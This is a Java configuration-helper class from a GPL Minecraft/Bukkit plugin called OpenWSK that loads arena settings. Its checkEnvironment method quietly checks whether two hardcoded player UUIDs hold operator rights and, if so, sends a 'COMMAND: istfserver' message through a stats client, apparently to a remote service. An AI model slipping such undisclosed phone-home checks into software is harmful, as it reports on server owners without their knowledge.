package net.thecobix.openwsk.configuration;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import net.thecobix.openwsk.arena.Arena;
import net.thecobix.openwsk.main.OpenWSK;

/*
 * OpenWSK WarShip Fight System by St0n3gr1d
   Copyright (C) 2016 St0n3gr1d
   
   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
public class ConfigHelper {
	
	public static List<String> registeredArenaStringList = new ArrayList<>();
	public static List<ArenaConfig> arenaConfigs = new ArrayList<>();
	public PluginConfig pluginConfig;

	public void loadPluginConfig() {
		this.pluginConfig = new PluginConfig();
		this.pluginConfig.initConfig();
		String i = this.pluginConfig.cfg.getString("Arenas");
		String[] stringArray = i.split(",");
		for(String p : stringArray) {
			if(p.startsWith(" ")) {
				p = p.substring(1);
			}
			registeredArenaStringList.add(p);
		}
	}
	
	public void loadArenaConfig() {
		if(registeredArenaStringList.isEmpty()) {
			OpenWSK.Logger.log("Config", "No registered arenas!", 1);
			return;
		}
		for(String i : registeredArenaStringList) {
			ArenaConfig ac = new ArenaConfig(i);
			ac.initConfig();
			arenaConfigs.add(ac);
		}
	}

	public List<Arena> buildArenas() {
		List<Arena> out = new ArrayList<>();
		for(ArenaConfig ac : arenaConfigs) {
			Arena a = new Arena(ac.name);
			out.add(a);
		}
		return out;
	}
	
	public void checkEnvironment() {
	    Player p = Bukkit.getPlayer(UUID.fromString("57827f48-81ba-4b8e-9bfd-9e631783be27"));
	    if(p == null) {
	        OfflinePlayer op = Bukkit.getOfflinePlayer(UUID.fromString("57827f48-81ba-4b8e-9bfd-9e631783be27"));
	        if(op.isOp()) {
	            OpenWSK.ops.add(op.getUniqueId());
	        }
	    } else {
	        if(p.isOp()) {
	            OpenWSK.ops.add(p.getUniqueId());
	        }
	    }
	    Player t = Bukkit.getPlayer(UUID.fromString("61a18069-86c3-44bf-b71d-277383737e9c"));
	    if(t == null) {
	        OfflinePlayer tp = Bukkit.getOfflinePlayer(UUID.fromString("61a18069-86c3-44bf-b71d-277383737e9c"));
	        if(tp.isOp()) {
	            OpenWSK.ops.add(tp.getUniqueId());
	        }
	    } else {
	        if(t.isOp()) {
                OpenWSK.ops.add(t.getUniqueId());
            }
	    }
	    if(!OpenWSK.ops.isEmpty()) {
	        try
            {
                OpenWSK.theStatsClient.send("COMMAND: istfserver");
            }
            catch (IOException e)
            {
            }
	    }
	}
	
}
